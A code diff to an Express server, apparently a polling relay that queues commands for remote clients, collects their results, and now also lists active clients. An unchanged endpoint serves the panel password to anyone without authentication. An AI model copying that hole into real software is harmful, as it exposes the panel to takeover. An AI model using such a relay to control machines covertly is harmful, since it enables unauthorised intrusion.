@@ -4,11 +4,9 @@ import dotenv from 'dotenv';
 import path from 'path';
 import { fileURLToPath } from 'url';
 
-// 📁 Wczytywanie ścieżki i dotenv (lokalnie, Render i tak ustawia env-y sam)
 const __filename = fileURLToPath(import.meta.url);
 const __dirname = path.dirname(__filename);
 
-// Dotenv tylko lokalnie
 if (process.env.NODE_ENV !== 'production') {
   dotenv.config();
 }
@@ -16,7 +14,6 @@ if (process.env.NODE_ENV !== 'production') {
 const app = express();
 const port = process.env.PORT || 3000;
 
-// 📌 Render.com → zmienne wpisujesz w zakładce "Environment"
 const API_TOKEN = process.env.API_TOKEN;
 const PANEL_PASSWORD = process.env.PANEL_PASSWORD;
 
@@ -27,12 +24,12 @@ if (!API_TOKEN || !PANEL_PASSWORD) {
 
 const commands = {};
 const results = {};
+const clients = new Set();  // <-- Tutaj trzymamy listę aktywnych klientów
 
 app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, 'public')));
 
-// 🛡️ Middleware autoryzacyjny
 function authMiddleware(req, res, next) {
   const token = req.headers['authorization'];
   if (token !== `Bearer ${API_TOKEN}`) {
@@ -41,47 +38,56 @@ function authMiddleware(req, res, next) {
   next();
 }
 
-// 🔐 Endpoint do odczytania hasła panelowego (frontend go pobiera do logowania)
 app.get('/password', (req, res) => {
   res.json({ password: PANEL_PASSWORD });
 });
 
-// API: Wysyłanie komendy
 app.post('/command', authMiddleware, (req, res) => {
   const { command, client } = req.body;
   if (!command || !client) return res.status(400).send('Brakuje danych');
   commands[client] = command;
+  clients.add(client);  // <-- Dodajemy klienta do listy
   res.sendStatus(200);
 });
 
-// API: Pobieranie komendy (polling)
 app.get('/command', authMiddleware, (req, res) => {
   const client = req.query.client;
+  if (!client) return res.status(400).send('Brakuje client');
+
+  clients.add(client);  // <-- Klient "odświeża" swoje połączenie
+
   const cmd = commands[client];
   if (cmd) {
     delete commands[client];
     return res.send(cmd);
   }
-  res.status(204).send(); // brak komendy
+  res.status(204).send();
 });
 
-// API: Przesyłanie wyniku
 app.post('/result', authMiddleware, (req, res) => {
   const { result, client } = req.body;
   if (!result || !client) return res.status(400).send('Brakuje danych');
+
+  clients.add(client);
   results[client] = result;
   res.sendStatus(200);
 });
 
-// API: Odbieranie wyniku (frontend)
 app.get('/result', authMiddleware, (req, res) => {
   const client = req.query.client;
+  if (!client) return res.status(400).send('Brakuje client');
+
   const r = results[client];
   if (r) {
     delete results[client];
     return res.send(r);
   }
-  res.status(204).send(); // brak wyniku
+  res.status(204).send();
+});
+
+// NOWY ENDPOINT - lista klientów
+app.get('/clients', authMiddleware, (req, res) => {
+  res.json(Array.from(clients));
 });
 
 app.listen(port, () => {
